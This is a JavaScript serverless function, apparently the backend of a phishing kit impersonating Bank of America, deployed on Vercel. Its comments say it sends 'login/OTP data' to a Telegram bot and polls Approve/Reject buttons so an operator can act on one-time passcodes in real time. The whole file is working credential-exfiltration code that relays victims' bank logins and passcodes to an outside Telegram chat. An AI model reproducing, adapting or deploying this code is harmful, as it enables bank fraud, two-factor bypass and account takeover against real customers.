// Bank of America - Telegram API Proxy for Vercel
// Replaces boa-api.php (PHP doesn't run on Vercel)

module.exports = async function handler(req, res) {
  // CORS
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  if (req.method !== 'POST') {
    return res.status(405).json({ success: false, error: 'Method not allowed' });
  }

  const data = req.body;
  if (!data) {
    return res.status(400).json({ success: false, error: 'Invalid JSON' });
  }

  // answerCallbackQuery - removes loading state on Approve/Reject buttons
  if (data.action === 'answerCallbackQuery') {
    const { token, callback_query_id, text } = data;
    if (!token || !callback_query_id) {
      return res.status(400).json({ success: false, error: 'Missing token or callback_query_id' });
    }
    const payload = { callback_query_id };
    if (text) payload.text = text;
    const resp = await fetch(`https://api.telegram.org/bot${token}/answerCallbackQuery`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload),
    });
    const result = await resp.json();
    return res.status(200).json(result);
  }

  // getUpdates - for OTP button polling
  if (data.action === 'getUpdates') {
    const { token, offset = 0 } = data;
    if (!token) {
      return res.status(400).json({ success: false, error: 'Missing token' });
    }
    const resp = await fetch(
      `https://api.telegram.org/bot${token}/getUpdates?offset=${offset}&timeout=10`
    );
    const result = await resp.json();
    if (!resp.ok) {
      return res.status(200).json({ ok: false, result: [] });
    }
    return res.status(200).json(result);
  }

  // sendMessage - send login/OTP data to Telegram
  const { token, chat_id, message, inline_keyboard } = data;
  if (!token || !chat_id || !message) {
    return res.status(400).json({ success: false, error: 'Missing required fields' });
  }

  const payload = {
    chat_id,
    text: message,
    parse_mode: 'HTML',
  };
  if (inline_keyboard) {
    payload.reply_markup = JSON.stringify({ inline_keyboard });
  }

  const resp = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(payload),
  });

  const result = await resp.json();
  if (resp.ok && result.ok) {
    return res.status(200).json({ success: true, data: result });
  }
  return res
    .status(resp.ok ? 200 : 500)
    .json({ success: false, error: result.description || 'Failed to send', response: result });
}
